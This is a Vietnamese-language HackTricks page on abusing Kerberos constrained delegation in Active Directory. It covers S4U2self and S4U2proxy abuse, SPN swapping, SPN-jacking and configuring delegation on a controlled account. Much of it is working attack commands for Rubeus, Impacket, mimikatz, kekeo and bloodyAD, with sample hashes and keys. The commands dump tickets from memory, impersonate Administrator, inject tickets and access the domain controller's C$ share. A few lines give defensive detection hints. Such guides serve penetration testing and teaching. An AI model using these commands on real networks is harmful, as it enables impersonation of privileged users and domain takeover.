# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Với tính năng này, quản trị viên Domain có thể **cho phép** một máy tính **mạo danh người dùng hoặc máy tính** để truy cập bất kỳ **service** nào trên một máy khác.

- **Service for User to self (_S4U2self_):** Bất kỳ **service account nào sở hữu SPN** thường có thể lấy TGS đến chính nó thay mặt cho một người dùng bất kỳ. Nếu account đó cũng có [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) trong _userAccountControl_, TGS đó sẽ **forwardable**. Điều này giúp protocol transition trở nên hữu ích trực tiếp cho **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Một **service account** có thể lấy TGS thay mặt cho một người dùng đến các SPN được liệt kê trong **msDS-AllowedToDelegateTo**. Ticket chứng thực được dùng trong S4U2Proxy phải là ticket **forwardable** đến service thực hiện delegation: hoặc là ticket client-to-service thực được lấy từ victim, hoặc ticket được tạo bằng **S4U2Self + T2A4D**.

**Lưu ý**: Nếu một người dùng được đánh dấu là ‘_Account is sensitive and cannot be delegated_’ trong AD, hoặc là thành viên của **Protected Users**, thông thường bạn sẽ **không thể mạo danh** họ thông qua constrained delegation. Trong các domain hiện đại, hãy ưu tiên dùng material **AES** thay vì chỉ giả định RC4 khi nhắm mục tiêu các account được bật delegation.

Điều này có nghĩa là nếu bạn **chiếm được hash của service**, bạn có thể **mạo danh người dùng** và thay mặt họ **truy cập** bất kỳ **service** nào trên các máy được chỉ định (có thể dẫn đến **privesc**).

Hơn nữa, bạn **không chỉ truy cập được service mà người dùng có thể mạo danh, mà còn truy cập được bất kỳ service nào**, vì SPN (tên service được yêu cầu) không được kiểm tra (phần này trong ticket không được mã hóa/ký). Do đó, nếu bạn truy cập được **CIFS service**, bạn cũng có thể truy cập **HOST service** bằng flag `/altservice` trong Rubeus chẳng hạn. Điểm yếu tương tự trong việc hoán đổi SPN cũng được khai thác bằng **Impacket getST -altservice** và các công cụ khác.

Ngoài ra, cần có quyền truy cập **LDAP service trên DC** để khai thác **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Lưu ý cho operator:** đừng chỉ dựa vào ảnh chụp màn hình **ADUC** hoặc BloodHound khi rà soát **gMSA/sMSA**. Các tài khoản này thường ẩn tab Delegation thông thường, vì vậy hãy trực tiếp liệt kê các thuộc tính thô **`userAccountControl`** và **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition vs constrained delegation chỉ dùng Kerberos

Nếu tài khoản bị xâm phạm có **T2A4D**, thông thường bạn có thể hoàn tất toàn bộ chuỗi **`S4U2Self -> S4U2Proxy`** chỉ với service key/TGT.<sup>[[2]](#references)</sup>

Nếu tài khoản chỉ có **`msDS-AllowedToDelegateTo`** (chế độ cổ điển **"Use Kerberos only"**), việc delegation vẫn có thể bị khai thác, nhưng vé chứng cứ cho S4U2Proxy phải là **vé user-to-service có thể forward** dành cho dịch vụ thực hiện delegation. Một cách là lấy TGS của nạn nhân từ **LSASS/ccache** rồi đưa nó vào giai đoạn thứ hai (`/tgs:` trong Rubeus). Vé S4U2Self **không thể forward** là **không đủ** cho constrained delegation cổ điển; nếu đó là vé chứng cứ duy nhất của bạn, hãy xem [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) thay thế.<sup>[[2]](#references)</sup>

Một hướng khác có điều kiện là thực hiện bước RBCD đầu tiên tới dịch vụ thực hiện delegation: nếu bước này tạo ra vé **có thể forward** cho người dùng và dịch vụ dự kiến, có thể kiểm tra vé đó làm chứng cứ cho một bước S4U2Proxy chỉ dùng Kerberos tiếp theo. Hãy xác nhận các flag của vé đầu tiên, SPN của dịch vụ thực hiện delegation, danh sách cho phép của đích và mọi hạn chế delegation của người dùng; chỉ kiểm soát thuộc tính RBCD không có nghĩa là bước thứ hai sẽ thành công.

### Ghi chú về constrained delegation xuyên miền (2025+)

Từ **Windows Server 2012/2012 R2**, KDC hỗ trợ **constrained delegation xuyên miền/forest** thông qua các phần mở rộng S4U2Proxy. Các bản dựng hiện đại (Windows Server 2016–2025) vẫn giữ hành vi này và bổ sung hai PAC SID để biểu thị protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) khi người dùng xác thực theo cách thông thường.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) khi một dịch vụ xác nhận danh tính thông qua protocol transition.

Khi protocol transition được dùng xuyên miền, hãy kiểm tra PAC để tìm `SERVICE_ASSERTED_IDENTITY`; SID này xác nhận bước S4U2Proxy đã thành công.<sup>[[1]](#references)</sup>

### Công cụ Impacket / Linux (altservice & S4U đầy đủ)

Các phiên bản Impacket mới (0.11.x+) hỗ trợ cùng chuỗi S4U và việc hoán đổi SPN như Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Nếu bạn muốn giả mạo ST của user trước (ví dụ: chỉ có hash offline), hãy kết hợp **ticketer.py** với **getST.py** để thực hiện S4U2Proxy. **tgssub.py** cũng hữu ích khi bạn đã có ccache hoạt động và chỉ cần đổi service class cho cùng một host. Xem issue #1713 đang mở của Impacket để biết các vấn đề hiện tại (KRB_AP_ERR_MODIFIED khi ST giả mạo không khớp với khóa SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: chuyển hướng mục tiêu constrained delegation

Constrained delegation kiểu cổ điển cho phép một **chuỗi SPN** trong `msDS-AllowedToDelegateTo`, chứ không phải một SID mục tiêu bất biến. Trong quá trình S4U2Proxy, KDC phân giải tài khoản hiện sở hữu SPN đó và mã hóa service ticket bằng khóa dài hạn của tài khoản đó. Vì vậy, quyền kiểm soát tài khoản delegating cùng với `WriteSPN` trên một tài khoản service/computer khác có thể chuyển hướng một ràng buộc delegation không đổi mà không cần `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Có hai biến thể:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** SPN được cho phép đã mồ côi vì chủ sở hữu trước đó bị xóa, đổi tên hoặc bị gỡ SPN. Thêm SPN đó trực tiếp vào tài khoản mục tiêu mong muốn.
- **Live SPN-jacking:** SPN vẫn thuộc về một tài khoản nguồn. Việc xác thực SPN trùng lặp thường chặn thao tác ghi lên đích, nên cần có `WriteSPN` trên cả hai object: gỡ SPN khỏi nguồn, thêm vào mục tiêu, lấy ticket rồi khôi phục đăng ký ban đầu.

Luồng Linux khái quát dưới đây di chuyển một SPN được cho phép, chạy S4U dưới danh nghĩa principal delegating đã bị xâm nhập, rồi viết lại tên service của ticket thành một service hữu ích trên mục tiêu mới.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` là primitive thứ hai, tách biệt. Ticket S4U2Proxy được mã hóa bằng khóa của tài khoản hiện đang sở hữu `$DELEGATED_SPN`; vì tên dịch vụ của ticket (`sname`) nằm ngoài phần thân ticket đã mã hóa, công cụ có thể thay thế bằng một service class/hostname khác có dịch vụ sử dụng cùng khóa tài khoản đó. SPN-jacking trước tiên thay đổi **khóa tài khoản nào** bảo vệ ticket, còn việc thay thế service class thay đổi **ticket đó được gửi đến đâu**.<sup>[[5]](#references)[[6]](#references)</sup>

Khi thực hiện live jacking, hãy đảo ngược hai thao tác ghi LDAP ngay sau khi lấy ticket để tránh làm gián đoạn dịch vụ hợp lệ. Trên DC đã bật kiểm toán tài khoản máy tính, hãy tìm sự kiện Security **4742** trong đó `servicePrincipalName` bị xóa khỏi một máy tính rồi nhanh chóng được thêm vào một máy tính khác, đặc biệt khi hostname SPN khác với `dNSHostName` của đích. Đối chiếu với sự kiện **4769**: S4U2Self dùng cùng một tài khoản làm client/service, trong khi S4U2Proxy điền **Transited Services**.<sup>[[5]](#references)</sup>

### Cấu hình delegation trên tài khoản được kiểm soát

Cách này yêu cầu **quyền ghi hiệu lực** đối với các thuộc tính delegation của tài khoản máy tính hoặc dịch vụ (ví dụ: `GenericAll`, hoặc `WriteDACL` rồi thay đổi ACL) **và** quyền người dùng `SeEnableDelegationPrivilege` đối với tài khoản thực hiện thay đổi LDAP. Microsoft yêu cầu có quyền này khi sửa đổi `msDS-AllowedToDelegateTo`; chỉ có quyền kiểm soát đối tượng không thể vượt qua yêu cầu đó. Hãy kiểm tra cả hai điều kiện tiên quyết trước khi dùng LDAP client như **bloodyAD** để thiết lập delegation chuyển tiếp giao thức.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Một tài khoản máy tính hiện có vẫn có thể là ứng viên ngay cả khi `ms-DS-MachineAccountQuota` bằng 0; hạn ngạch đó giới hạn cách tạo máy tính mới mặc định, chứ không giới hạn quyền trên một đối tượng hiện có. Để sử dụng cấu hình delegation, bạn cũng cần kiểm soát khóa hoặc mật khẩu của tài khoản ủy quyền, một service principal name hợp lệ và một người dùng mục tiêu có thông tin xác thực có thể ủy quyền. Cần kiểm tra riêng các điều kiện này và quyền truy cập thực tế trong directory.

- Step 1: **Lấy TGT của dịch vụ được phép**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Có **những cách khác để lấy vé TGT** hoặc **RC4** hay **AES256** mà không cần có quyền SYSTEM trên máy tính, chẳng hạn như Printer Bug và unconstrained delegation, relay NTLM và lạm dụng Active Directory Certificate Service
>
> **Chỉ cần có vé TGT đó (hoặc hash), bạn có thể thực hiện cuộc tấn công này mà không cần chiếm quyền kiểm soát toàn bộ máy tính.**

- Step2: **Lấy TGS cho dịch vụ bằng cách mạo danh người dùng**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Tìm hiểu thêm tại ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) và [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Tổng quan về Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Lạm dụng Delegation với Impacket (Phần 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity đã hạ gục domain: Tổng quan về Kerberos theo hướng tấn công (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Trường hợp đặc biệt trong lạm dụng WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
